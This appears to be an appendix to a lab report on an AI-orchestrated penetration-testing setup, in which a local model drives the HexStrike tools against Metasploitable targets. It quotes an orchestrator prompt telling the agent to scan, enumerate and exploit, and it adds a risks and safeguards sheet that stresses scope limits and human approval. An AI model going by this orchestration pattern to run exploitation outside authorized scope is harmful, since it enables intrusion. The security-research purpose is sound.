- **Log excerpts.** HexStrike `/health` JSON (v6.0.0, 82 tools); `hexstrike_mcp` startup; agent run logs
  `/tmp/hexstrike_agent_*.log` (scan + enum + conclusion); Metasploit exploitation output.
- **Prompts used.**
  - *Orchestrator system prompt* (agent): "You are an authorized penetration-testing orchestrator operating
    in an isolated lab against operator-owned Metasploitable targets… work step by step: scan, enumerate,
    identify a vulnerability, then exploit it…" (full text in `hexstrike_agent.py`).
  - *Task prompts* used, e.g. "Scan and enumerate 192.168.50.11; identify the most likely exploitable
    vulnerability. Scan only common ports, not all 65535."
  - *Analysis prompts* (platform): defensive-brief and lab-exploitation prompt versions.
- **Model parameters.** `temperature 0` (deterministic analysis/orchestration; `0.4` for the educational
  walkthrough), `num_ctx 8192`, `num_predict 1200/2600`, tool-calling enabled, Q4_K_M, 14.8 B.
- **Connectivity logs.** `hexstrike_mcp` → `:8888` (healthy, v6.0.0); Ollama `/api/tags` and `/api/ps`
  (model loaded locally); orchestration transcript showing tool calls and results.

---

## Risks and Safeguards Sheet (one page)

**What are the risks?**
- Autonomous or careless offensive automation causing unintended damage or scanning out-of-scope hosts.
- Prompt injection from tool output steering the model into unsafe actions.
- An uncensored local model producing harmful guidance outside the authorized context.
- Target/scope creep; sensitive data exposure; a powerful tool-set misused beyond the lab.

**What controls should be implemented?**
- Reviewed tool allow-list with bounded parameters; generic command execution and exploitation excluded
  from any automated path.
- Approved, private (RFC1918) target allow-list enforced in code; public targets refused.
- Operator-triggered runs only; explicit human confirmation for any intrusive/exploitation action.
- Local-only, loopback-pinned model endpoint; no cloud inference.
- Full, tamper-evident audit of every request, decision and tool execution, tied to an authenticated user.
- Network isolation (air-gapped lab segment); targets are disposable VMs.

**What level of human oversight is required?**
- **High.** A human must initiate every orchestration and must personally perform/authorise every
  exploitation step. The AI is decision-support and reconnaissance, not an autonomous attacker.

**Legal, ethical and operational limitations.**
- *Legal/ethical:* only systems the operator owns or is explicitly authorized to test; isolated lab;
  educational purpose; no public scanning except the explicitly authorized megacorpone exercise.
- *Operational:* CPU-only latency limits throughput; a small local model is less reliable than a hosted
  model; results require human validation; an empty scan is not proof a target is secure.
